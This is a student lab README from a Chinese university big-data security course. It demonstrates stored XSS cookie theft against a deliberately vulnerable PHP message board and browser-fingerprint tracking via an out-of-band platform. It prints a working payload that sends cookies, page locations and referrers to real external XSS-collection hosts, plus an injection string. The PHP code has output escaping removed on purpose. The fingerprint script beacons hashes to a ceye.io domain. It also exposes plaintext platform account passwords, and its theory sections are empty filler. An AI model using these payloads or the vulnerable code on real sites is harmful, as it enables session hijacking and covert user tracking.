# 大数据安全实验三提高部分

BUPT-SCSS第三次大数据安全实验演示demo，包含XSS和在线追踪两个部分。

## Cookie窃取方法——XSS

### 简述

小组经过调研，对XSS攻击技术进行了探究，并制作Demo进行演示。

本Demo是使用php-mysql架构搭建的典型的Web留言板应用，留言板具有注册、登录、对指定用户留言、查看其他用户给自己的留言等功能。如果后端对用户输入的留言内容过滤不严，就容易出现XSS漏洞。

<img src="./pics/Screen Shot 2020-11-11 at 11.36.45.png" style="zoom:50%;" />

XSS的payload代码放置在公网XSS平台上，代码具有窃取Headers、Cookies等功能。

```javascript
(function(){(new Image()).src='https://xsshs.cn/xss.php?do=api&id=pou2&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
if('1'==1){keep=new Image();keep.src='https://xsshs.cn/xss.php?do=keepsession&id=pou2&url='+escape(document.location)+'&cookie='+escape(document.cookie)};
var x=new Image();
try
{
var myopener='';
myopener=window.opener && window.opener.location ? window.opener.location : '';
}
catch(err)
{
}
x.src='{$xssite}/?do=api&act=r&id={$pid}&diy[location]='+escape(document.location)+'&diy[toplocation]='+escape(top.document.location)+'&diy[cookie]='+escape

(document.cookie)+'&diy[opener]='+escape(myopener)+'&diy[referrer]='+escape(document.referrer)+'&diy[title]='+escape(document.title);
```

使用只需插入如下语句

```
</textarea>'"><script src=//xs.sb/pou2></script>
```

### XSS基本原理

> 这里懒得写了  凑字数  加油
>
> 可以如此安排内容：
>
> XSS基本原理
>
> XSS的分类（反射型、存储型、DOM型），本实验用到了存储型XSS攻击方式
>
> XSS攻击的流程（反射型一般是诱导受害者点击URL，存储型和DOM型会在用户站点长期存在，访问即受害）
>
> XSS攻击的防御（前端过滤、后端编码、服务器端设置CSP）（针对Cookie的窃取，使用HttpOnly防护）

### 环境配置与关键代码

docker与镜像版本

```
# docker --version
Docker version 19.03.13, build 4484c46d9d
# mysql --version
mysql  Ver 14.14 Distrib 5.7.32, for Linux (x86_64) using  EditLine wrapper
```

搭建mysql环境需要执行如下命令

```bash
#bash环境
docker pull mysql:5.7

docker run -id --name=mysql_test -p 3306:3306 --volume `pwd`/sqlsrc:/sqlsrc -e MYSQL_ROOT_PASSWORD=123456 mysql:5.7

docker exec -it mysql_test /bin/bash

#进入docker环境
mysql -u root -p 123456

#进入mysql环境
source /sqlsrc/table.sql
```

其中建表语句如下

```sql

create table pinfo (id INT(6) AUTO_INCREMENT PRIMARY KEY,
username varchar(30) NOT NULL,
password varchar(10) NOT NULL,
name varchar(30) NOT NULL,
regtime TIMESTAMP
);


create table message (id INT(6) AUTO_INCREMENT PRIMARY KEY,
receiver varchar(30) NOT NULL,
sender varchar(30) NOT NULL,
content varchar(200) NOT NULL,
sendtime TIMESTAMP
);

```

php框架关键代码如下所示

`main.php` 负责显示用户的留言，这里存在XSS漏洞。

```php
<body>
<div>
    <h2>
        <a href="issue.php" rel="external nofollow">发布信息</a>
        <a href="quit.php" rel="external nofollow">退出系统</a>
    </h2>
</div>
<br/><br/>
<?php
    session_start();
    $user = $_SESSION["username"];
    echo "<b>欢迎用户：".$user."</b> <br>";
?>
<h2>留言信息：</h2>
<table cellpadding="0" cellspacing="0" border="1" width="60%">
    <tr>
        <td>发送人</td>
        <td>接收人</td>
        <td>发送时间</td>
        <td>信息内容</td>
    </tr>
<?php
    if (empty($user))
    {
        header("location:login.php");
        exit;
    }

    require "DBManager.php";
    $dbmanager = new CMessageBoardDBM();
    $sql = "SELECT receiver, sender, sendtime, content FROM message where receiver = '$user'";
    $arr = $dbmanager->Query($sql);

    if ($arr->num_rows > 0){
        while ($row = $arr->fetch_assoc()){
            echo "
            <tr>
            <td>" . $row["receiver"] ."</td>
            <td>" . $row["sender"] . "</td>
            <td>" . $row["sendtime"] . "</td>
            <td>" . $row["content"] . "</td>
            </tr>";
        }
    }
    ?>
</table>
</body>

```

issue.php是留言处理逻辑，此处虽然对用户输入做了addslashes，避免了sql注入，但未经htmlSpecialChars过滤，导致了XSS的可能。

```php
<h1>发布信息</h1>
<a href="main.php">主界面</a>
<br/>
<br/>

<?php
session_start();
$user = $_SESSION["username"];
if (empty($user))
{
    header("location:login.php");
    exit;
}

require "DBManager.php";
$dbmanager = new CMessageBoardDBM();
$sql = "select password from pinfo where username=$user";
$sql = "SELECT username FROM pinfo";
$result = $dbmanager->Query($sql);

$alluser = array();
?>

<form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"])?>">
    <p>接收人：
        <select name="jsr">
            <option value="all" checked>所有人</option>
            <?php
            while ($row = $result->fetch_assoc())
            {
                array_push($alluser, $row["username"]);
                if ($row["username"] != $user)
                    echo "<option value=" . $row["username"] .">" . $row["username"] . "</option>";
            }
            ?>
        </select>
    </p>
    <br/>
    <p>
        信息内容：<textarea name="content"></textarea>
    </p>
    <br/>
    <input type="submit" value="发送" />
</form>

<?php
function data_input($data)
{
    $data = trim($data);
    $data = stripslashes($data);
    # 不进行htmlSpecialchars过滤，会导致html控制字符直接显示在html文档中，进而导致XSS
    //$data = htmlspecialchars($data);
    return $data;
}

if ($_SERVER["REQUEST_METHOD"] == "POST" and !empty($_POST["jsr"] and !empty($_POST["content"])))
{
    $jsr = data_input($_POST["jsr"]);
    $content = data_input($_POST["content"]);

    //  使用预处理语句
    $sql = "INSERT INTO message(receiver, sender, content) VALUES(?, ?, ?)";
    $conn = $dbmanager->getConn();
    $stmt = $conn->prepare($sql) or die($conn->error);
    if ($jsr != "all")
    {
        $stmt->bind_param('sss', $jsr, $user, $content);
        $stmt->execute();
    }
    else
    {
        foreach ($alluser as $index => $value) {
            if ($value != $user){
            $stmt->bind_param('sss', $value, $user, $content);
            $stmt->execute();
            }
        }
    }
}
?>
```

代码已经托管到github，使用git clone后进入项目`/src`文件夹，使用`php -S localhost:port`命令即可搭建一个简易的测试用服务器。

### 演示

我们提前在留言板注册了用户c1、`c2`，可看到他们之间的留言正常显示

<img src="./pics/Screen Shot 2020-11-11 at 11.52.37.png" alt="Screen Shot 2020-11-11 at 11.52.37" style="zoom: 33%;" />

<img src="./pics/Screen Shot 2020-11-11 at 11.54.19.png" alt="Screen Shot 2020-11-11 at 11.54.19" style="zoom:67%;" />

查看浏览器Cookie，可以看到PHP的session，以及我们提前设置的Cookie。这个Cookie是没有HttpOnly保护的。

<img src="./pics/Screen Shot 2020-11-11 at 11.54.56.png" style="zoom:67%;" />

在XSS在线平台`https://xs.sb`注册一个账号，建立XSS项目设置我们需要执行的payload，并保存平台生成的链接。

> 用户名：Arklight
>
> 密码：1085455474
>
> 到时候记得自己注册一个

<img src="./pics/Screen Shot 2020-11-11 at 11.58.15.png" alt="Screen Shot 2020-11-11 at 11.58.15" style="zoom:150%;" />

接下来c2向c1发送了这样一条信息`</textarea>'"><script src=//xs.sb/pou2></script>`

<img src="./pics/Screen Shot 2020-11-11 at 12.09.36.png" alt="Screen Shot 2020-11-11 at 12.09.36" style="zoom:50%;" />

进入c1的登录界面，同时使用控制台Network监视流量，可以看到XSS Payload被加载、Cookie以HTTP-GET方式外带的过程。

<img src="./pics/Screen Shot 2020-11-11 at 12.12.10.png" style="zoom: 50%;" />

<img src="./pics/Screen Shot 2020-11-11 at 12.12.57.png" style="zoom:67%;" />

检查我们的XSS平台，可看到攻击生效，确实窃取了用户Cookie。

<img src="./pics/Screen Shot 2020-11-11 at 12.14.16.png" style="zoom:67%;" />

## 在线追踪实验——浏览器指纹技术

### 简述

在之前的大数据扩展阅读作业中，小组选择了关于Web追踪技术的论文进行调研。本次在线追踪实验根据论文中CanvasFingerprinti指纹的实现思路，基于 Fingerprint2 开源实现做了复现。

本demo自搭Node.js服务器，使用CanvasFP/WebGLFP两种浏览器指纹技术进行用户追踪，并利用CEYE带外平台接收XSS生成的指纹数据。

### 基本原理

> 懒得写了，凑字数，加油
>
> 抄论文报告就行

### 环境配置与关键代码

因为Web追踪的代码主要由JS实现，所以后端实现采用Node.js比较方便，版本如下

```
node -v
v12.18.3
```

进入项目的`fingerprintDemo`目录，执行标准安装流程

```
npm install

npm run dev
```

就可以在本地看到自己浏览器的指纹。该指纹仅依赖于浏览器，即使不同时间、地点访问，也不会改变指纹的值。

<img src="./pics/Screen Shot 2020-11-11 at 15.37.23.png" alt="Screen Shot 2020-11-11 at 15.37.23" style="zoom:50%;" />

将JS中带外平台的URL设置为本地，就可以在本地看到刚刚生成的指纹哈希。

<img src="./pics/Screen Shot 2020-11-11 at 15.46.17.png" alt="Screen Shot 2020-11-11 at 15.46.17" style="zoom:80%;" />

关键代码如下

**index.js**中是指纹生成和发送的逻辑

```javascript
import Fingerprint2 from 'fingerprintjs2'
import canvasFP from './core/canvasFP'
import webglFp from './core/webglFP'
function log(info) {
    let ele = document.createElement("p");
    ele.style.fontSize = "12px";
    ele.innerHTML = info;
    document.body.appendChild(ele)
}

// 记住需要延时一段时间之后再去获取浏览器的指纹，因为网页加载时候立即调用会偶发出现不准确的问题。
// 500ms 延时是Fingerprint2推荐的做法
setTimeout(function () {
    Fingerprint2.get(function (components) {
        console.log(components)
    });

    var cfp = canvasFP().hash;
    var wfp = webglFp().hash;
    log("canvas fingerprint : " + cfp);
    log("webgl fingerprint : " + wfp);

    console.log("canvas fingerprint : "+cfp);
    console.log("webgl fingerprint : "+wfp);

var httpRequest = new XMLHttpRequest();
var url = "http://osk53t.ceye.io?canvas_fp="+cfp+"&webgl_fp="+wfp;
httpRequest.open('GET', url, true);
httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");//设置请求头 注：post方式必须设置请求头（在建立连接后设置请求头）
httpRequest.send();

}, 500);

```

`canvasFP`和`webglFP`根据FingerPrint2对指纹生成进行实现。

<img src="./pics/Screen Shot 2020-11-11 at 16.01.05.png" alt="Screen Shot 2020-11-11 at 16.01.05" style="zoom:80%;" />

因为浏览器存在CORB限制，我们不能通过读取另一个源执行的js，因此要对js进行webpack生成可以直接执行的js

```
npm run build
```

获得webpack文件，再从浏览器打开下载，形成`rev.js`。该js文件就是xss所需的文件，将其放入我们的公网服务器即可。此处为了演示方便，在不影响利用原理的前提下，直接放在了本地的php测试服务器，访问`localhost:yourport/rev.js`即可加载。

pack后的js功能不变，可以直接在浏览器执行。

### 演示

提前在CEYE带外平台注册账号，记录生成的域名，接下来会通过XSS将数据发送到带外平台。

> 账号 1085455474@qq.com
>
> 密码 bjm1085455474
>
> 记得自己注册一个，并且把这些删了

<img src="./pics/Screen Shot 2020-11-11 at 15.47.43.png" alt="Screen Shot 2020-11-11 at 15.47.43" style="zoom:80%;" />

构造XSS语句。XSS payload可以放在公网服务器上，此处为了演示方便直接放置在本地。

于是如此构造xss语句即可。

```
<srcipt src="//127.0.0.1:8888/rev.js"></script>
```

按照刚才的方式，由用户2发送xss语句给用户1

<img src="./pics/Screen Shot 2020-11-11 at 15.52.57.png" alt="Screen Shot 2020-11-11 at 15.52.57" style="zoom:50%;" />

可见XSS被成功执行，带外平台也收到了刚生成的浏览器指纹信息。

<img src="./pics/Screen Shot 2020-11-11 at 15.50.14.png" alt="Screen Shot 2020-11-11 at 15.50.14" style="zoom:80%;" />